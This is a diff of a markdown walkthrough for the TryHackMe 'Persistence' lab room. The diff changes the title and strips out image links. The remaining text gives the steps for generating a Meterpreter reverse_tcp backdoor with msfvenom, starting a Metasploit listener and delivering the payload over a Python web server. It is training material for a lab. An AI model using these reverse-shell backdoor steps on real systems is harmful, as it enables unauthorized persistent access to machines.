@@ -1,6 +1,4 @@
-# Persistence
-
-Learn how to establish persistence post-compromise and ensure your access!
+# Persistence TryHackMe Room
 
 [Persistence](https://tryhackme.com/room/persistence)
 
@@ -53,19 +51,13 @@ Start by deploying the machine and connect to it through RDP using the following
 
 I used Remmina to RDP into the machine. If you don't have it installed, you can install it using the following command: `sudo apt-get install remmina`
 
-![](https://i.imgur.com/DD9cjnv.png)
-
 Create a Metasploit backdoor using msfvenom. To create the backdoor use the below syntax:
 
 `msfvenom -p windows/meterpreter/reverse_tcp <LHOST> <LPORT> -f exe > backdoor.exe`
 
 where LHOST is your IP and LPORT is he port Metasploit will listen for connections.
 
-![](https://i.imgur.com/FR0EPbY.png)
-
 Create a Metasploit listener.
-
-![](https://i.imgur.com/uj2ubTP.png)
 
 Using python create a webserver (python -m SimpleHTTPServer 80) and deliver (download) the backdoor to the target system you previously logged in.
 
